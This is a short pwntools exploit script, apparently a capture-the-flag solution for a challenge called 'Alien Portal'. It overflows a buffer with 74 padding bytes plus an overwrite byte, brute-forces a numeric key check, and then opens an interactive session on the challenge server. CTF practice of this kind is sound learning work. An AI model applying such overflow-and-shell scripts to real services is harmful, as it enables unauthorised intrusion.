"""
Exploit Script for Alien Portal
Author: @gatariee
"""

from pwn import remote
import random

def encrypt_key(key):
    length_key = len(key)
    sum_key = 0
    for letter in key:
        sum_key += ord(letter)
    return sum_key * length_key

def generate_key():
    while 1:
        key = ""
        for _ in range(4):
            key += random.choice("abcdefghijklmnopqrstuvwxyz")
            if(encrypt_key(key) == 1804):
                return key
            

io = remote('nc.lagncra.sh', 8011)

OFFSET = 'A' * 74

IP = chr(1)
STAGE_1 = OFFSET + IP

STAGE_2 = generate_key()


io.sendline(STAGE_1)
io.recvuntil(":")
io.sendline(STAGE_2)
io.interactive()
